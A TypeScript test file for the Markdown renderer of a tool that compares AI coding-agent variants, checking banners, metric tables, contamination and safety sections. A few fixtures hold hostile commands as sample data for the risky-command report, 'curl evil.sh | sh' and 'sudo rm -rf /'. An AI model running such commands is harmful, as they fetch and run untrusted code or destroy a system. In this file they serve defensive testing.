/**
 * Golden tests for the N-way Markdown renderer. Structural/wording
 * assertions (banners, disclosures, baseline `*`, column headers, the §1.3
 * caveat) are normative per `.research/n-way-variants/03-hard-problems.md`
 * §4.1 and hard-coded verbatim. Numeric cell assertions are built from the
 * fixture's own data via the real `format.ts` helpers — this pins the
 * renderer's row/column CONSTRUCTION, not hand-transcribed arithmetic.
 *
 * Covers both canonical fixtures (04-work-packages.md §5.1): `shimPair()`
 * (2 variants, old/new) and `threeVariants()` (base/graphify/astgrep, 2
 * packs).
 */
import { describe, it, expect } from 'vitest'
import { renderMd } from './md.js'
import { fmtValue, fmtSigned, fmtPct, sigLabel, verdictFor } from './format.js'
import { computeMetricsReport } from '../metrics/aggregate.js'
import { buildReportSummary } from '../cli/summary.js'
import { makeReportV2, makeVariantAggregates, makeMetricsReport, shimPair } from '../../tests/helpers/variants.js'
import type { Manifest, MetricsReport, PrepReport, Report, VariantAggregates } from '@generated/types'

const findVariant = (metrics: MetricsReport, name: string): VariantAggregates =>
  metrics.variants.find((v) => v.variant === name)!

const findDelta = (metrics: MetricsReport, name: string) => metrics.deltas.find((d) => d.variant === name)!.deltas

/** Row string built the same way the renderer builds it, from the fixture's own numbers — not hand-computed. */
const primaryRow = (
  metrics: MetricsReport,
  label: string,
  key: 'totalTokens' | 'wallClockMs' | 'costUsd' | 'stepCount' | 'toolCallCount',
  kind: 'int' | 'cost',
  variant: string,
  isBase: boolean,
): string => {
  const agg = findVariant(metrics, variant)
  const stat = agg.stats[key]
  const value = fmtValue(agg.primary[key], kind)
  const spread = `${fmtValue(stat.min, kind)}–${fmtValue(stat.max, kind)}${stat.iqr === undefined ? '' : ` (IQR=${fmtValue(stat.iqr, kind)})`}`
  if (isBase) return `| ${label} | ${variant}* | ${value} | ${spread} | — | — | — | — |`
  const d = findDelta(metrics, variant)[key]
  return `| ${label} | ${variant} | ${value} | ${spread} | ${fmtSigned(d.absolute, kind)} | ${fmtPct(d.percent)} | ${sigLabel(d)} | ${verdictFor(d)} |`
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/** 3-variant fixture (base/graphify/astgrep, 2 packs) — the primary N-way golden fixture. */
const threeVariantsReport = (): Report => makeReportV2()

/** 2-variant shim fixture (old/new, 1 pack) — validates backward-compat rendering. */
const shimReport = (over: Partial<Report> = {}): Report => {
  const { runInput } = shimPair()
  const manifest: Manifest = {
    schemaVersion: 2,
    runId: 'run-shim-001',
    timestamp: '2025-01-01T00:00:00.000Z',
    repoUrl: runInput.repoUrl,
    ...(runInput.prompt === undefined ? {} : { prompt: runInput.prompt }),
    runs: 1,
    parallel: 1,
    baseline: 'old',
    packs: runInput.packs,
    variants: runInput.variants,
    isolation: 'home',
    opencodeVersion: '0.5.0',
    flagDefaults: {},
  }
  const metrics = computeMetricsReport('old', [makeVariantAggregates('old'), makeVariantAggregates('new')])
  return {
    schemaVersion: 2,
    manifest,
    metrics,
    timeline: {
      lanes: [
        { variant: 'old', events: [] },
        { variant: 'new', events: [] },
      ],
      mode: 'side-by-side',
    },
    diffs: [
      {
        variant: 'old',
        runs: [
          {
            runIndex: 1,
            fullPatch: 'diff --git a/a.txt b/a.txt\n@@ -1 +1 @@\n-x\n+y\n',
            summary: { filesChanged: 1, additions: 1, deletions: 1, perFile: [{ path: 'a.txt', additions: 1, deletions: 1 }] },
            noChanges: false,
          },
        ],
      },
      {
        variant: 'new',
        runs: [
          {
            runIndex: 1,
            fullPatch: 'diff --git a/a.txt b/a.txt\n@@ -1 +1 @@\n-x\n+z\n',
            summary: { filesChanged: 1, additions: 1, deletions: 1, perFile: [{ path: 'a.txt', additions: 1, deletions: 1 }] },
            noChanges: false,
          },
        ],
      },
    ],
    judge: {
      verdict: 'ok',
      scores: [
        { variant: 'old', quality: 5 },
        { variant: 'new', quality: 7 },
      ],
      ranking: ['new', 'old'],
      explanation: 'new is cleaner',
      modelUsed: 'gpt-test',
      timestamp: '2025-01-01T00:05:00.000Z',
    },
    summary: buildReportSummary(metrics),
    ...over,
  }
}

// ---------------------------------------------------------------------------
// Header
// ---------------------------------------------------------------------------

describe('renderMd — header', () => {
  it('threeVariants: variants line marks baseline with *, discloses packs and pure', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toContain('**Variants:** base* (no packs, pure), graphify (packs: graphify), astgrep (packs: astgrep)')
    expect(md).toContain('**Runs:** 1 per variant')
  })

  it('shimPair: variants line marks old as baseline, new declares demo-pack', () => {
    const md = renderMd(shimReport())
    expect(md).toContain('**Variants:** old* (no packs, pure), new (packs: demo-pack)')
  })

  it('hint disclosure: identical effective hint across all variants renders without the "differ" suffix', () => {
    const report = threeVariantsReport()
    const withHint: Report = {
      ...report,
      manifest: { ...report.manifest, hint: 'be careful' },
    }
    const md = renderMd(withHint)
    expect(md).toContain('**Hint:** base, graphify, astgrep — "be careful"')
    expect(md).not.toContain('variants differ')
  })

  it('hint disclosure: a per-variant hint override triggers the mandatory "variants differ" warning', () => {
    const report = threeVariantsReport()
    const withHint: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        variants: report.manifest.variants.map((v) =>
          v.name === 'graphify' ? { ...v, hint: 'If .graphify/ exists, use it' } : v,
        ),
      },
    }
    const md = renderMd(withHint)
    expect(md).toContain('**Hint:** graphify — "If .graphify/ exists, use it" (variants differ — comparison measures prompt+pack together)')
  })

  it('init disclosure: variants relying on the global --init are grouped, a variant with its own --init is called out separately', () => {
    const report = threeVariantsReport()
    const withInit: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        init: 'npm install',
        variants: report.manifest.variants.map((v) => (v.name === 'astgrep' ? { ...v, init: 'setup astgrep' } : v)),
      },
    }
    const md = renderMd(withInit)
    expect(md).toContain('**Init:** base, graphify — global init; astgrep — own init ("setup astgrep")')
  })

  it('no init/hint configured → neither disclosure line is rendered', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).not.toContain('**Init:**')
    expect(md).not.toContain('**Hint:**')
  })

  it('B2 regression: an explicit hint: "" DISABLES the inherited global (D7) — it must not silently fall back to it and hide the divergence', () => {
    const report = threeVariantsReport()
    const withHint: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        hint: 'use good practices',
        variants: report.manifest.variants.map((v) => (v.name === 'astgrep' ? { ...v, hint: '' } : v)),
      },
    }
    const md = renderMd(withHint)
    // base and graphify fall back to the global hint; astgrep's explicit ''
    // disables it outright — astgrep must NOT appear in the rendered group,
    // and the divergence (one variant sees no hint at all) must still be flagged.
    expect(md).toContain('**Hint:** base, graphify — "use good practices" (variants differ — comparison measures prompt+pack together)')
    expect(md).not.toMatch(/astgrep.*use good practices/)
  })

  it('B2 regression: an explicit init: "" DISABLES the inherited global — rendered as "init disabled", never as a false "own init"', () => {
    const report = threeVariantsReport()
    const withInit: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        init: 'npm install',
        variants: report.manifest.variants.map((v) => (v.name === 'astgrep' ? { ...v, init: '' } : v)),
      },
    }
    const md = renderMd(withInit)
    expect(md).toContain('**Init:** base, graphify — global init; astgrep — init disabled')
    expect(md).not.toContain('astgrep — own init ("")')
  })

  it('B2: a per-variant prompt override is disclosed via a **Prompt:** line, mirroring hint', () => {
    const report = threeVariantsReport()
    const withPrompt: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        prompt: 'implement the feature',
        variants: report.manifest.variants.map((v) => (v.name === 'graphify' ? { ...v, prompt: 'implement it with graphify' } : v)),
      },
    }
    const md = renderMd(withPrompt)
    expect(md).toContain('**Prompt:** base, astgrep — "implement the feature"; graphify — "implement it with graphify" (variants differ — comparison measures prompt+pack together)')
  })

  it('identical prompt across all variants renders without the "differ" suffix', () => {
    const report = threeVariantsReport()
    const withPrompt: Report = { ...report, manifest: { ...report.manifest, prompt: 'do the thing' } }
    const md = renderMd(withPrompt)
    expect(md).toContain('**Prompt:** base, graphify, astgrep — "do the thing"')
    expect(md).not.toMatch(/\*\*Prompt:\*\*.*variants differ/)
  })

  it('opencode version drift warning fires only when a run used a version other than the manifest', () => {
    const report = threeVariantsReport()
    const withDrift: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) => (v.variant === 'graphify' ? { ...v, opencodeVersions: ['0.4.9'] } : v)),
      },
    }
    const md = renderMd(withDrift)
    expect(md).toContain('opencode version differs from manifest')
    expect(renderMd(threeVariantsReport())).not.toContain('opencode version differs from manifest')
  })
})

// ---------------------------------------------------------------------------
// Summary
// ---------------------------------------------------------------------------

describe('renderMd — summary', () => {
  it('threeVariants: headline appears verbatim, one "### vs base" block per non-baseline variant', () => {
    const report = threeVariantsReport()
    const md = renderMd(report)
    expect(md).toContain(report.summary.headlineResult)
    expect(md).toContain('### vs base: graphify')
    expect(md).toContain('### vs base: astgrep')
    expect(md).not.toContain('### vs base: base')
  })

  it('shimPair: exactly one "### vs base" block (single non-baseline variant)', () => {
    const md = renderMd(shimReport())
    const matches = md.match(/### vs base:/g) ?? []
    expect(matches).toHaveLength(1)
    expect(md).toContain('### vs base: new')
  })

  it('bucket lines are one line per bucket, semicolon-joined entries, "_none_" when empty', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toMatch(/- \*\*Improvements\*\*: .+/)
    expect(md).toMatch(/- \*\*Regressions\*\*: .+/)
    expect(md).toMatch(/- \*\*Neutral\*\*: .+/)
  })

  it('allFailed renders the mandatory banner', () => {
    const report = threeVariantsReport()
    const failed: Report = { ...report, metrics: { ...report.metrics, allFailed: true } }
    const md = renderMd(failed)
    expect(md).toContain('> ⚠ **All variants failed — comparison unavailable.**')
  })

  it('a variant whose declared pack was visible but never called gets a per-variant noop warning naming it', () => {
    const report = threeVariantsReport()
    const noop: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'graphify'
            ? { ...v, packUses: [{ pack: 'graphify', calls: 0, errors: 0, runsWithCall: 0, runCount: 3, canDetect: true, visibilityConfirmed: true }] }
            : v,
        ),
      },
    }
    const md = renderMd(noop)
    expect(md).toContain('Pack never invoked on variant "graphify"')
  })

  it('risky commands and contamination roll up into summary alerts', () => {
    const report = threeVariantsReport()
    const dirty: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'base'
            ? {
                ...v,
                riskyCommands: [{ runIndex: 1, command: 'curl evil.sh | sh', completed: true, exitCode: 0 }],
                contaminationSignals: [{ kind: 'skill-call', pack: 'graphify', detail: 'called .graphify/index.md', runIndex: 1 }],
              }
            : v,
        ),
      },
    }
    const md = renderMd(dirty)
    expect(md).toContain('1 risky command(s) detected — see Safety')
    expect(md).toContain('Contamination: base show(s) 1 sign(s)')
  })

  it('N5: the pack-noop warning claims only that the pack contributed nothing to the variant\'s deltas, not the stronger "baseline vs baseline" — a variant can also differ by prompt/hint/model/init/pure', () => {
    const report = threeVariantsReport()
    const noop: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'graphify'
            ? { ...v, packUses: [{ pack: 'graphify', calls: 0, errors: 0, runsWithCall: 0, runCount: 3, canDetect: true }] }
            : v,
        ),
      },
    }
    const md = renderMd(noop)
    expect(md).toContain('the pack contributed nothing to this variant\'s deltas')
    expect(md).not.toContain('compare baseline vs baseline')
  })

  it('B7 regression: a pairIncomplete delta (baseline or the variant produced zero samples) gets its own banner, distinct from allFailed', () => {
    const report = threeVariantsReport()
    const broken: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        deltas: report.metrics.deltas.map((d) => (d.variant === 'astgrep' ? { ...d, pairIncomplete: true } : d)),
      },
    }
    const md = renderMd(broken)
    expect(md).toContain('> ⚠ **astgrep — baseline or this variant produced zero samples; the delta row below is not a meaningful comparison.**')
    // graphify's pair is fine — no warning for it.
    expect(md).not.toMatch(/graphify — baseline or this variant produced zero samples/)
  })

  it('B7: pairIncomplete banners are suppressed when allFailed already covers the all-N-empty case', () => {
    const report = threeVariantsReport()
    const broken: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        allFailed: true,
        deltas: report.metrics.deltas.map((d) => ({ ...d, pairIncomplete: true })),
      },
    }
    const md = renderMd(broken)
    expect(md).toContain('> ⚠ **All variants failed — comparison unavailable.**')
    expect(md).not.toContain('the delta row below is not a meaningful comparison')
  })

  it('B6 regression: two variants sharing a pack — only the one with its OWN successful exercise gets the informational note; the other gets the real noop warning', () => {
    const report = threeVariantsReport()
    // Hypothetical: astgrep also declares the 'graphify' pack, sharing it
    // with the graphify variant, but only graphify's own exercise ran.
    const shared: Report = {
      ...report,
      manifest: {
        ...report.manifest,
        variants: report.manifest.variants.map((v) => (v.name === 'astgrep' ? { ...v, packs: ['graphify'] } : v)),
      },
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'graphify' || v.variant === 'astgrep'
            ? { ...v, packUses: [{ pack: 'graphify', calls: 0, errors: 0, runsWithCall: 0, runCount: 3, canDetect: true }] }
            : v,
        ),
      },
      prep: {
        packs: [{ pack: 'graphify', mode: 'exercised', setupDeclared: true, checkDeclared: false, exerciseDeclared: true, setups: [], checks: [] }],
        variants: [
          { variant: 'base', exerciseDeclared: false, exercises: [] },
          { variant: 'graphify', exerciseDeclared: true, exercises: [{ variant: 'graphify', runIndex: 1, exitCode: 0, durationMs: '1000' }] },
          { variant: 'astgrep', exerciseDeclared: false, exercises: [] },
        ],
      },
    }
    const md = renderMd(shared)
    expect(md).toContain('Pack was never called directly on variant "graphify"')
    expect(md).toContain('Pack never invoked on variant "astgrep" — the pack contributed nothing')
  })
})

// ---------------------------------------------------------------------------
// Primary metrics — metric-major table, baseline `*`, §1.3 caveat
// ---------------------------------------------------------------------------

describe('renderMd — primary metrics table', () => {
  it('column header matches the normative shape exactly', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toContain('| Metric | Variant | Median | [min–max] | Δ vs base | Δ% | Significant | Verdict |')
  })

  it('baseline row renders first per metric group, marked with *, em-dashes on delta columns', () => {
    const report = threeVariantsReport()
    const md = renderMd(report)
    expect(md).toContain(primaryRow(report.metrics, 'Total tokens', 'totalTokens', 'int', 'base', true))
    const idx = md.indexOf('| Total tokens | base*')
    const graphifyIdx = md.indexOf('| Total tokens | graphify')
    expect(idx).toBeGreaterThan(-1)
    expect(graphifyIdx).toBeGreaterThan(idx)
  })

  it('non-baseline rows carry the real delta, percent, significance and verdict', () => {
    const report = threeVariantsReport()
    const md = renderMd(report)
    expect(md).toContain(primaryRow(report.metrics, 'Total tokens', 'totalTokens', 'int', 'graphify', false))
    expect(md).toContain(primaryRow(report.metrics, 'Total tokens', 'totalTokens', 'int', 'astgrep', false))
    expect(md).toContain(primaryRow(report.metrics, 'Cost ($)', 'costUsd', 'cost', 'graphify', false))
  })

  it('graphify totalTokens is a significant improvement (hand-verified against the fixture comment: Δ=-1200 > 2.25*300)', () => {
    const report = threeVariantsReport()
    const d = findDelta(report.metrics, 'graphify').totalTokens
    expect(d.significant).toBe(true)
    expect(d.better).toBe('better')
    expect(d.absolute).toBe(-1200)
    const md = renderMd(report)
    expect(md).toContain('| Total tokens | graphify | 10900 | 10600–11200 (IQR=300) | -1200 | -9.9% | ✓ significant | ✓ better |')
  })

  it('every PRIMARY_METRICS row is present for every variant (7 metrics × 3 variants = 21 rows)', () => {
    const md = renderMd(threeVariantsReport())
    const rows = md.split('\n').filter((l) => l.startsWith('| ') && !l.startsWith('| Metric') && !l.includes('---'))
    expect(rows.length).toBeGreaterThanOrEqual(21)
  })

  it('§1.3 caveat renders under the primary table when N−1 > 1 (3 variants → 2 comparisons)', () => {
    const report = threeVariantsReport()
    const md = renderMd(report)
    expect(md).toContain(
      '_* baseline. N−1 = 2 comparisons share one baseline; at this sample size expect occasional spurious "significant" flags — treat cross-variant differences in flag count, not any single flag, as the signal._',
    )
  })

  it('§1.3 caveat is absent for a 2-variant report (N−1 = 1, nothing to caveat)', () => {
    const md = renderMd(shimReport())
    expect(md).toContain('_* baseline._')
    expect(md).not.toContain('N−1')
  })

  it('allFailed renders the primary-table warning', () => {
    const report = threeVariantsReport()
    const failed: Report = { ...report, metrics: { ...report.metrics, allFailed: true } }
    expect(renderMd(failed)).toContain('> ⚠ **All variants failed — comparison unreliable.**')
  })

  it('B3 regression: --baseline pointing at a NON-FIRST config entry still puts that row first in every metric group', () => {
    // `manifest.variants` stays in its declared config order (base, graphify,
    // astgrep) — only `metrics.baseline` changes, exactly what a real
    // `--baseline graphify` run would look like. The table must not assume
    // `variants[0]` is the baseline.
    const report = threeVariantsReport()
    const rebased: Report = { ...report, metrics: { ...report.metrics, baseline: 'graphify' } }
    const md = renderMd(rebased)
    const totalTokensLines = md.split('\n').filter((l) => l.startsWith('| Total tokens |'))
    expect(totalTokensLines[0]).toContain('| graphify* |')
    expect(totalTokensLines[0]).toContain('| — | — | — | — |')
    expect(totalTokensLines[1]).toContain('| base |')
    expect(totalTokensLines[2]).toContain('| astgrep |')
  })
})

// ---------------------------------------------------------------------------
// Stability
// ---------------------------------------------------------------------------

describe('renderMd — stability', () => {
  it('one line per variant, baseline marked with *', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toMatch(/- \*\*base\*\*\*: success rate/)
    expect(md).toMatch(/- \*\*graphify\*\*: success rate/)
    expect(md).toMatch(/- \*\*astgrep\*\*: success rate/)
  })

  it('unstable metrics are called out with a magnitude ratio', () => {
    const report = threeVariantsReport()
    const unstable: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'graphify'
            ? { ...v, stats: { ...v.stats, wallClockMs: { median: 10000, min: 1000, max: 20000, iqr: 15000, samples: [1000, 5000, 15000, 20000] } } }
            : v,
        ),
      },
    }
    const md = renderMd(unstable)
    expect(md).toContain('unstable: Wall-clock (ms) (20.0×)')
  })

  it('B3 regression: stability also puts the baseline row first when --baseline is not the first config entry', () => {
    const report = threeVariantsReport()
    const rebased: Report = { ...report, metrics: { ...report.metrics, baseline: 'astgrep' } }
    const md = renderMd(rebased)
    const stabilityBlock = md.slice(md.indexOf('### Stability'))
    const lines = stabilityBlock.split('\n').filter((l) => l.startsWith('- **'))
    expect(lines[0]).toContain('astgrep*')
    expect(lines[1]).toContain('base')
    expect(lines[2]).toContain('graphify')
  })
})

// ---------------------------------------------------------------------------
// Phase split
// ---------------------------------------------------------------------------

describe('renderMd — phase split', () => {
  const phaseSlice = (over: Partial<Record<string, number>> = {}) => ({
    totalTokens: String(3000 + (over['totalTokens'] ?? 0)),
    wallClockMs: String(10000 + (over['wallClockMs'] ?? 0)),
    costUsd: 0.01,
    stepCount: 4,
    toolCallCount: 6,
  })
  const dist = (v: number) => ({ median: v, min: v, max: v, samples: [v, v, v, v], iqr: 1 })
  const phaseSliceStats = () => ({
    totalTokens: dist(3000),
    wallClockMs: dist(10000),
    costUsd: dist(0.01),
    stepCount: dist(4),
    toolCallCount: dist(6),
  })

  it('absent entirely when no variant ever ran a phase split', () => {
    expect(renderMd(threeVariantsReport())).not.toContain('## Phase split')
  })

  it('present with task-phase table and per-variant setup lines when at least one variant has phaseSplit', () => {
    const report = threeVariantsReport()
    const withSplit: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'graphify'
            ? {
                ...v,
                phaseSplit: {
                  runsWithInit: 0,
                  runsWithLostInit: 0,
                  task: phaseSlice(),
                  taskStats: phaseSliceStats(),
                  setup: { wallClockMs: '9000' },
                },
              }
            : v,
        ),
      },
    }
    const md = renderMd(withSplit)
    expect(md).toContain('## Phase split (init vs task)')
    expect(md).toContain('### Task phase (like-for-like)')
    expect(md).toContain('- **graphify**: pack setup (harness, no model call) — median 9000ms')
    expect(md).toContain('_No variant ran `--init`._')
  })

  it('lost-init runs are called out per variant', () => {
    const report = threeVariantsReport()
    const withLost: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'astgrep'
            ? { ...v, phaseSplit: { runsWithInit: 1, runsWithLostInit: 1, task: phaseSlice(), taskStats: phaseSliceStats() } }
            : v,
        ),
      },
    }
    const md = renderMd(withLost)
    expect(md).toContain('> ⚠ astgrep: 1 run(s) ran --init but the export lost the init session — init cost unmeasured.')
  })
})

// ---------------------------------------------------------------------------
// Harness preparation (Pack column, declared-vs-foreign, mode banners)
// ---------------------------------------------------------------------------

const buildPrep = (): PrepReport => ({
  packs: [
    {
      pack: 'graphify',
      mode: 'exercised',
      setupDeclared: true,
      checkDeclared: true,
      exerciseDeclared: false,
      setups: [{ variant: 'graphify', runIndex: 0, exitCode: 0, durationMs: '12000' }],
      checks: [
        { variant: 'graphify', runIndex: 1, exitCode: 0, durationMs: '300' },
        { variant: 'base', runIndex: 1, exitCode: 1, durationMs: '150' },
      ],
    },
    {
      pack: 'astgrep',
      mode: 'installed-only',
      setupDeclared: true,
      checkDeclared: false,
      exerciseDeclared: false,
      undeclaredDepWarning: 'astgrep looks like it wraps an external CLI but no --pack-check was declared',
      setups: [{ variant: 'astgrep', runIndex: 0, exitCode: 0, durationMs: '5000' }],
      checks: [],
    },
  ],
  variants: [
    { variant: 'base', exerciseDeclared: false, exercises: [] },
    { variant: 'graphify', exerciseDeclared: true, exercises: [{ variant: 'graphify', runIndex: 1, exitCode: 0, durationMs: '8000', artifactHash: 'ab12cd34ef56' }] },
    { variant: 'astgrep', exerciseDeclared: false, exercises: [] },
  ],
})

describe('renderMd — harness preparation', () => {
  it('absent entirely when prep is undefined', () => {
    expect(renderMd(threeVariantsReport())).not.toContain('## Harness preparation')
  })

  it('evidence table carries the Pack column; declared-vs-foreign cmdStatus (foreign+non-zero-exit renders as correctly-absent)', () => {
    const report = threeVariantsReport()
    const withPrep: Report = { ...report, prep: buildPrep() }
    const md = renderMd(withPrep)
    expect(md).toContain('| Step | Pack | Variant | Run | Result | Wall-clock | Artifact hash |')
    expect(md).toContain('| setup | graphify | graphify | — | ✓ | 12000ms | — |')
    expect(md).toContain('| check | graphify | graphify | 1 | ✓ | 300ms | — |')
    expect(md).toContain('| check | graphify | base | 1 | ✓ | 150ms | — |')
    expect(md).toContain('| exercise | — | graphify | 1 | ✓ | 8000ms | ab12cd34ef56 |')
  })

  it('one banner per pack, naming the pack and its mode', () => {
    const report = threeVariantsReport()
    const withPrep: Report = { ...report, prep: buildPrep() }
    const md = renderMd(withPrep)
    expect(md).toContain('> **graphify**:')
    expect(md).toContain('> **astgrep**:')
    expect(md).toContain('the harness installed the pack, verified it functional, and ran its pipeline before each measured run')
  })

  it('undeclared-dependency warning renders per pack', () => {
    const report = threeVariantsReport()
    const withPrep: Report = { ...report, prep: buildPrep() }
    const md = renderMd(withPrep)
    expect(md).toContain('> ⚠ astgrep looks like it wraps an external CLI but no --pack-check was declared')
  })

  it('a foreign check that exits 0 (tool present where it should not be) is flagged, not silently ✓', () => {
    const prep = buildPrep()
    const contaminated: PrepReport = {
      ...prep,
      packs: prep.packs.map((p) => (p.pack === 'graphify' ? { ...p, checks: [{ variant: 'base', runIndex: 1, exitCode: 0, durationMs: '150' }] } : p)),
    }
    const report = threeVariantsReport()
    const withPrep: Report = { ...report, prep: contaminated }
    const md = renderMd(withPrep)
    expect(md).toContain('✗ tool present on foreign variant (exit 0)')
  })
})

// ---------------------------------------------------------------------------
// Pack signal — nested per (pack, variant), foreign rows only when non-zero
// ---------------------------------------------------------------------------

describe('renderMd — pack signal', () => {
  const withPackSignal = (): Report => {
    const base = makeVariantAggregates('base', {
      packUses: [{ pack: 'graphify', calls: 2, errors: 0, runsWithCall: 2, runCount: 3, canDetect: true }],
    })
    const graphify = makeVariantAggregates('graphify', {
      packUses: [{ pack: 'graphify', calls: 3, errors: 0, runsWithCall: 3, runCount: 3, canDetect: true, firstCallMsMedian: '500' }],
    })
    const astgrep = makeVariantAggregates('astgrep', {
      packUses: [
        { pack: 'astgrep', calls: 2, errors: 0, runsWithCall: 2, runCount: 3, canDetect: true },
        { pack: 'graphify', calls: 0, errors: 0, runsWithCall: 0, runCount: 3, canDetect: true },
      ],
    })
    return makeReportV2({ metrics: makeMetricsReport({ variants: [base, graphify, astgrep] }) })
  }

  it('declared pack use renders call/error/run counts nested under (pack, variant)', () => {
    const md = renderMd(withPackSignal())
    expect(md).toContain('- **graphify** (variant graphify): 3 call(s), 0 error(s), 3/3 runs called the pack, first-call median 500ms')
  })

  it('a non-zero foreign call renders the contamination-warning wording', () => {
    const md = renderMd(withPackSignal())
    expect(md).toContain('- **graphify** (variant base): 2 call(s) — foreign; any call would be contamination')
  })

  it('a zero-call foreign entry stays silent (expected state, not a signal)', () => {
    const md = renderMd(withPackSignal())
    expect(md).not.toContain('variant astgrep): 0 call(s) — foreign')
  })
})

// ---------------------------------------------------------------------------
// Safety
// ---------------------------------------------------------------------------

describe('renderMd — safety', () => {
  it('table carries the Variant column', () => {
    const report = threeVariantsReport()
    const dirty: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'astgrep' ? { ...v, riskyCommands: [{ runIndex: 2, command: 'sudo rm -rf /', completed: false }] } : v,
        ),
      },
    }
    const md = renderMd(dirty)
    expect(md).toContain('| Variant | Run | Command | Completed | Exit |')
    expect(md).toContain('| astgrep | 2 | `sudo rm -rf /` | false | — |')
  })

  it('absent when no variant has risky commands', () => {
    expect(renderMd(threeVariantsReport())).not.toContain('## Safety')
  })
})

// ---------------------------------------------------------------------------
// Baseline contamination — Variant + Pack columns
// ---------------------------------------------------------------------------

describe('renderMd — baseline contamination', () => {
  it('table carries Variant and Pack columns, alert names affected variants', () => {
    const report = threeVariantsReport()
    const dirty: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'base'
            ? { ...v, contaminationSignals: [{ kind: 'skill-call', pack: 'graphify', detail: 'called .graphify/index.md', runIndex: 1 }] }
            : v,
        ),
      },
    }
    const md = renderMd(dirty)
    expect(md).toContain('| Kind | Variant | Pack | Run | Detail |')
    expect(md).toContain('| skill-call | base | graphify | 1 | `called .graphify/index.md` |')
    expect(md).toContain('Contamination: base show(s) 1 sign(s)')
  })

  it('absent when no variant is contaminated', () => {
    expect(renderMd(threeVariantsReport())).not.toContain('## Baseline contamination')
  })

  it('a variant-level install-drift signal (WP7 sentinel pack: "") renders "—" in the Pack column, not an empty cell', () => {
    const report = threeVariantsReport()
    const drifted: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'base' ? { ...v, contaminationSignals: [{ kind: 'install-drift', pack: '', detail: 'lockfile changed' }] } : v,
        ),
      },
    }
    const md = renderMd(drifted)
    expect(md).toContain('| install-drift | base | — | — | `lockfile changed` |')
  })
})

// ---------------------------------------------------------------------------
// Secondary metrics — per-variant blocks
// ---------------------------------------------------------------------------

describe('renderMd — secondary metrics', () => {
  it('one "### {variant} secondary" block per variant', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toContain('### base secondary')
    expect(md).toContain('### graphify secondary')
    expect(md).toContain('### astgrep secondary')
  })

  it('shimPair: blocks for old and new', () => {
    const md = renderMd(shimReport())
    expect(md).toContain('### old secondary')
    expect(md).toContain('### new secondary')
  })
})

// ---------------------------------------------------------------------------
// Failed runs
// ---------------------------------------------------------------------------

describe('renderMd — failed runs', () => {
  it('table rows carry the variant name (from ReportSummary.failures)', () => {
    const report = threeVariantsReport()
    const withFailure: Report = {
      ...report,
      summary: {
        ...report.summary,
        failures: [{ variant: 'astgrep', runIndex: 2, errorCode: 'E_RUN_CRASH', errorMessage: 'boom', timestamp: '2025-01-01T00:02:00.000Z' }],
      },
    }
    const md = renderMd(withFailure)
    expect(md).toContain('## Failed runs')
    expect(md).toContain('| Variant | Run | Code | Message |')
    expect(md).toContain('| astgrep | 2 | `E_RUN_CRASH` | boom |')
  })

  it('absent when there are no failures', () => {
    expect(renderMd(threeVariantsReport())).not.toContain('## Failed runs')
  })
})

// ---------------------------------------------------------------------------
// LLM Judge — ranking, per-variant quality, pairwise-fallback note
// ---------------------------------------------------------------------------

describe('renderMd — judge', () => {
  it('renders ranking and one quality entry per variant in config order', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toContain('- Ranking: graphify > astgrep > base')
    expect(md).toContain('- Quality: base=6, graphify=8, astgrep=7')
  })

  it('pairwise-fallback note appears only when pairwiseFallback is true', () => {
    const report = threeVariantsReport()
    const fallback: Report = { ...report, judge: { ...report.judge!, pairwiseFallback: true } }
    const md = renderMd(fallback)
    expect(md).toContain('_Scores derived from pairwise-vs-baseline calls (prompt exceeded the single-call budget)._')
    expect(renderMd(report)).not.toContain('pairwise-vs-baseline')
  })

  it('judge not requested / did not run', () => {
    const report = threeVariantsReport()
    const { judge: _judge, ...notRequested } = report
    expect(renderMd(notRequested)).toContain('_Judge was not requested (--judge not set)_')
    const didNotRun: Report = { ...report, judge: { ...report.judge!, ran: false, explanation: 'judge crashed' } }
    expect(renderMd(didNotRun)).toContain('_Judge did not run: judge crashed_')
  })

  it('contamination warning on the judge section names affected variants', () => {
    const report = threeVariantsReport()
    const dirty: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'base' ? { ...v, contaminationSignals: [{ kind: 'skill-call', pack: 'graphify', detail: 'x' }] } : v,
        ),
      },
    }
    const md = renderMd(dirty)
    expect(md).toContain('Contamination detected (base)')
    // B5: only ONE variant is contaminated here — the wording must not
    // overstate this as "both used a pack they don't declare".
    expect(md).not.toContain('both used')
  })
})

// ---------------------------------------------------------------------------
// Timeline summary
// ---------------------------------------------------------------------------

describe('renderMd — timeline summary', () => {
